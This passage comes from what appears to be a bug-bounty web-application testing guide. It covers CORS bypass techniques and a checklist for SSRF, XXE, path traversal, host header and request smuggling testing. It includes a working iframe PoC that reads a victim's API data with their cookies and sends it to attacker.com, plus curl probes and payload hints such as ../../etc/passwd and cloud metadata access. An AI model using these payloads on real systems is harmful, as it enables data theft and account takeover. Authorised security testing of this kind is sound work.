#### 5.7.2 Null Origin Bypass

🔍 **Some apps allowlist `null` origin — triggered by sandboxed iframes:**

```bash
# Test:
curl -sv -H "Origin: null" \
  https://target.com/api/data \
  -H "Cookie: session=<token>" 2>&1 | \
  grep -i "access-control-allow-origin: null"
```

**PoC via sandboxed iframe:**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="<script>
fetch('https://target.com/api/user', {credentials: 'include'})
.then(r => r.text())
.then(d => top.location='https://attacker.com/steal?d='+encodeURIComponent(d))
</script>">
</iframe>
<!-- sandbox attribute causes Origin: null → bypasses null allowlist -->
```

---

#### 5.7.3 Subdomain-Based CORS Bypass

🔍 **App allows `*.target.com` — find XSS on any subdomain:**

```bash
# Test: does app allow subdomains?
curl -sv -H "Origin: https://evil.target.com" \
  https://target.com/api/sensitive \
  -H "Cookie: session=<token>" 2>&1 | \
  grep "access-control-allow-origin: https://evil.target.com"
```

**If wildcard subdomain allowed + XSS on sub.target.com:**
```
1. XSS on sub.target.com (any subdomain)
2. Use XSS to make credentialed fetch to target.com/api/
3. Response is readable because Origin: sub.target.com is allowed
4. Exfil data via the XSS
Combined impact: XSS + CORS misconfiguration = data exfiltration of any user's data
```

---

#### 5.7.4 CORS + Credentials = ATO Path

🔍 **The critical condition: both headers must be present:**
```
Access-Control-Allow-Origin: https://attacker.com   ← reflects attacker origin
Access-Control-Allow-Credentials: true               ← sends cookies cross-origin

Without ACAO credentials: true → cookies not sent → can't access authenticated endpoints
Without reflected origin → browser blocks read → can't exfil data
Both needed → full authenticated CORS read → ATO possible
```

**What CORS misconfig can expose:**
```
GET /api/user/me        → full PII, email, address
GET /api/tokens         → API keys, OAuth tokens
GET /api/settings       → security settings, connected accounts
GET /api/payments       → payment methods (last 4, billing address)
POST /api/email/change  → if CORS allows writes (rare but exists)
```

---

### Part 5 — Complete Testing Checklist

```
SSRF
□ Every URL/uri/src/link/webhook parameter → interactsh callback
□ Import features, avatar URLs, document generators, link preview
□ Confirmed SSRF → try AWS/GCP/Azure metadata endpoints
□ Filter bypass: decimal IP, hex IP, IPv6, DNS rebinding, redirect chain
□ Blind SSRF → internal port scan via response time/content difference
□ Protocols: file://, gopher://, dict:// if HTTP blocked

OPEN REDIRECT
□ All redirect parameters: next=, url=, return=, goto=, redirect=
□ Bypass: //, @, backslash, subdomain confusion, fragment, encoding
□ Chain with OAuth redirect_uri → ATO
□ Chain with SSRF filter bypass → metadata access
□ Report standalone only if chained or clearly impactful

XXE
□ All XML-accepting endpoints → basic file read payload
□ Switch JSON endpoint to XML (change Content-Type)
□ File uploads: SVG, DOCX, XLSX, PPTX → inject XXE in XML layer
□ SOAP endpoints → WSDL discovery, XXE in every field
□ Blind XXE → DTD-based OOB via interactsh
□ XXE → SSRF → metadata endpoint

PATH TRAVERSAL / LFI
□ File/path/template/doc/page parameters → ../../etc/passwd
□ Filter bypass: URL encoding, double encode, nested traversal, null byte
□ PHP targets: php://filter wrapper for source read
□ Log poisoning → RCE (Apache/Nginx access log)
□ File download endpoints → traverse to sensitive config files
□ Windows targets: ..\..\ and win.ini as confirmation

HOST HEADER
□ Password reset poisoning (→ 2.2.2)
□ Reflect Host in response? → cache poisoning potential
□ X-Forwarded-Host reflection → same as Host
□ SSRF via Host header routing

CORS
□ Send Origin: https://attacker.com → reflected in ACAO?
□ Access-Control-Allow-Credentials: true also present?
□ Send Origin: null → allowed?
□ Send Origin: https://sub.target.com → wildcard subdomain allowed?
□ Both conditions met → write credentialed fetch PoC

REQUEST SMUGGLING
□ HTTP Request Smuggler extension → safe automated probe
□ CL.TE timing probe (10-second hang = vulnerable)
□ Report type (CL.TE/TE.CL/TE.TE) and let triager assess impact
```

📚 **Part 5 Master References:**
- [PortSwigger SSRF labs](https://portswigger.net/web-security/ssrf)
- [PortSwigger XXE labs](https://portswigger.net/web-security/xxe)
- [PortSwigger Path traversal labs](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger CORS labs](https://portswigger.net/web-security/cors)
- [PortSwigger Request smuggling (James Kettle)](https://portswigger.net/web-security/request-smuggling)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Gopherus — gopher payload generator](https://github.com/tarunkant/Gopherus)


*Status: COMPLETE — Iteration 6*

> **The mindset:** Business logic flaws are the bugs that prove you understand
> the application, not just the technology. They are invisible to scanners because
> they require knowing what the application is *supposed* to do and then testing
> whether it *actually* does it. No CVE, no payload, no tool — just intent and
> observation. These bugs are consistently underreported and consistently well-paid
> because finding them requires a human who thought carefully.

---

